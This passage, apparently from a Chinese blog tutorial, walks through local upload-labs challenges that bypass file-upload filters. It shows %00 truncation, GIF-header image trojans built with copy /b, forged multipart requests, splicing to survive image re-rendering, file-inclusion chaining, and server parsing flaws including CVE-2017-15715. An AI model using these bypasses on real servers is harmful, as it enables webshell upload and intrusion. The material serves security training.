+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Disposition&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;save_path&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;../&lt;/span&gt;&lt;span class="n"&gt;upload&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start="4"&gt;
+&lt;li&gt;选择 &lt;code&gt;%00&lt;/code&gt; 按下 &lt;code&gt;ctrl + shift + u&lt;/code&gt; 进行俩 decode ， 然后放行 (%00 会变成一个空的方框一样的东西)&lt;/li&gt;
+&lt;li&gt;访问 http://localhost/upload/1.php 成功&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id="13-文件头检测绕过"&gt;13-文件头检测绕过
+&lt;/h2&gt;&lt;p&gt;之前的章节一直是用后缀名限制，并且是黑名单，属于较容易绕过的上传漏洞。
+从这里开始的Pass基本上都是白名单了。&lt;/p&gt;
+&lt;p&gt;Pass-13&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;适用范围：采用文件魔数字（文件头的两个字节）判断文件类型的检测
+上传的图片木马需要借助 &lt;a class="link" href="http://localhost/include.php" target="_blank" rel="noopener"
+&gt;文件包含漏洞&lt;/a&gt; 才能正常运行&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;常见的文件头参考表（HEX格式） &lt;a class="link" href="https://blog.51cto.com/u_2982693/3354695" target="_blank" rel="noopener"
+&gt;51CTO博客_&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;JPEG (jpg)，文件头：FFD8FF&lt;/li&gt;
+&lt;li&gt;PNG (png)，文件头：89504E47
+这些都是16进制文件头，可以使用 &lt;a class="link" href="https://gchq.github.io/CyberChef/#recipe=From_Hex%28%27Auto%27%29" target="_blank" rel="noopener"
+&gt;From Hex - CyberChef&lt;/a&gt; 尝试在线解码 ，比如 jpg 解码后是 &lt;code&gt;ÿØÿ&lt;/code&gt; 但一般这种乱码都不好用，比较推荐利用gif文件，gif的头&lt;code&gt;47 49 46 38&lt;/code&gt;解码后是 &lt;code&gt;GIF8&lt;/code&gt; ，可以轻松使用burp上传。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;获取文件头还有一种简单的方式，就是找到一个文件，用记事本打开，然后复制第一个单词之类的&lt;/p&gt;
+&lt;p&gt;制作图片马 有两种方式，一种是基于真正的图片，一种是抓包修改头部，让服务器以为自己收到的是图片。&lt;/p&gt;
+&lt;h3 id="基于真正的图片法"&gt;基于真正的图片法
+&lt;/h3&gt;&lt;p&gt;打开cmd ，准备好 1.gif 和 1.php ，执行下方代码：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;copy&lt;/span&gt; &lt;span class="mf"&gt;1.&lt;/span&gt;&lt;span class="n"&gt;gif&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mf"&gt;1.&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="n"&gt;ma&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gif&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;制作好&lt;code&gt;ma.gif&lt;/code&gt;之后，用记事本打开，可以发现，相当于在 原版的 &lt;code&gt;1.gif&lt;/code&gt; 尾部，追加了 &lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt; 。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;上传&lt;code&gt;ma.gif&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;获取上传后路径 http://localhost/upload/1020230731134955.gif ， 路径为 &lt;code&gt;upload/1020230731134955.gif&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;与文件包含漏洞 http://localhost/include.php 组合&lt;/li&gt;
+&lt;li&gt;访问 http://localhost/include.php?file=upload/1020230731134955.gif 图片马执行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="抓包修改头部法"&gt;抓包修改头部法
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;上传 1.php&lt;/li&gt;
+&lt;li&gt;抓包修改
+原包&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;-----------------------------&lt;/span&gt;&lt;span class="mi"&gt;30629768524726476051439622056&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Disposition&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;upload_file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;1.php&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;octet&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="n"&gt;phpinfo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;修改后(修改了文件后缀名和包内容前面部分)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;-----------------------------&lt;/span&gt;&lt;span class="mi"&gt;30629768524726476051439622056&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Disposition&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;upload_file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;1.gif&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;octet&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;GIF8&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt; &lt;span class="n"&gt;phpinfo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start="3"&gt;
+&lt;li&gt;截获返回包，搜索&lt;code&gt;../upload&lt;/code&gt; 搜索到上传位置 ：/upload/8320230731140148.gif&lt;/li&gt;
+&lt;li&gt;与文件包含漏洞 http://localhost/include.php 组合&lt;/li&gt;
+&lt;li&gt;访问 http://localhost/include.php?file=upload/8320230731140148.gif 图片马执行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="14-绕过图片二次渲染"&gt;14-绕过图片二次渲染
+&lt;/h2&gt;&lt;p&gt;Pass-16&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;适用范围：图片上传后会进行压缩，压缩后可能会损坏php后门的情况
+上传的图片木马需要借助 &lt;a class="link" href="http://localhost/include.php" target="_blank" rel="noopener"
+&gt;文件包含漏洞&lt;/a&gt; 才能正常运行&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;解法：先正常上传文件（推荐gif，因为gif压缩比小），然获取压缩后文件，进行对比找到未压缩的部分，用php后门覆盖一小块未压缩部分的文件&lt;/p&gt;
+&lt;p&gt;使用工具：HxD Hex Editor&lt;br&gt;
+如果你不想要用这个win工具，可以试试网页版Hex编辑器，但是可能会很卡顿 &lt;a class="link" href="https://hexed.it/" target="_blank" rel="noopener"
+&gt;https://hexed.it/&lt;/a&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;上传1.gif，获取上传后文件20161.gif&lt;/li&gt;
+&lt;li&gt;通过使用 HxD工具进行查看和对比，发现文件前部基本无区别，覆盖修改一部分内容为&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?php phpinfo();?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start="3"&gt;
+&lt;li&gt;另存为 3.gif&lt;/li&gt;
+&lt;li&gt;上传3.gif ，获取到上传后路径： upload/17173.gif&lt;/li&gt;
+&lt;li&gt;与文件包含漏洞 http://localhost/include.php 组合&lt;/li&gt;
+&lt;li&gt;访问 http://localhost/include.php?file=upload/17173.gif 图片马执行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="15-文件名可控绕过"&gt;15-文件名可控绕过
+&lt;/h2&gt;&lt;p&gt;适用范围：php&amp;lt;5.3.4 ， 未开启gpc , 使用%00&lt;/p&gt;
+&lt;p&gt;对于iis&amp;lt;6.0 ： 使用分号 1.asp;1.jpg&lt;/p&gt;
+&lt;p&gt;对于apache ，使用 .a 1.php.a (优先左解释)&lt;/p&gt;
+&lt;p&gt;斜杠法 ： 1.php/.&lt;/p&gt;
+&lt;h2 id="17-文件上传其他漏洞"&gt;17-文件上传其他漏洞
+&lt;/h2&gt;&lt;p&gt;nginx 0.83&lt;/p&gt;
+&lt;p&gt;上传jpg文件，访问 &lt;code&gt;1.jpg%00php&lt;/code&gt; ，会被当作php解析&lt;/p&gt;
+&lt;p&gt;apahce 1.x 或者 2.x&lt;/p&gt;
+&lt;p&gt;当 apache 遇见不认识的后缀名，会从后向前解析例
+如 1.php.rar 不认识 rar 就向前解析，直到知道它认识的后缀名。&lt;/p&gt;
+&lt;p&gt;phpcgi 漏洞(nginx iis7 或者以上)&lt;/p&gt;
+&lt;p&gt;上传图片1.jpg。访问 1.jpg/1.php 也会解析成 php。&lt;/p&gt;
+&lt;p&gt;Apache HTTPD 换行解析漏洞（CVE-2017-15715）&lt;/p&gt;
+&lt;p&gt;apache通过 mod_php来运行脚本，其 2.4.0-2.4.29中存在apache 换行解析漏洞，上传文件名为 &lt;code&gt;xxx.php\x0A&lt;/code&gt;（x0A) 是换行符
+将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略&lt;/p&gt;</description></item></channel></rss>
